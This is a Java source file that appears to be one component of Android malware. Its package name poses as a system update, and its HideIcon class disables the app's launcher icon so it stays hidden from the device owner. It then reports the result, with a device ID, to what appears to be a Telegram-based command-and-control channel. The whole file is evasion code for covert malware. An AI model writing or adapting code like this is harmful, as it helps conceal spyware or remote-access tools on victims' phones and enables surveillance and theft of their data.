package com.system.update;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

/** Disable launcher activity — app only via service / reopen tricks. */
public final class HideIcon {
    private HideIcon() {}

    public static void hide(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName cn = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            Telegram.reportEvent(C2.getDeviceId(), "launcher_hidden");
        } catch (Throwable t) {
            Telegram.reportEvent(C2.getDeviceId(), "hide_err:" + t.getMessage());
        }
    }
}
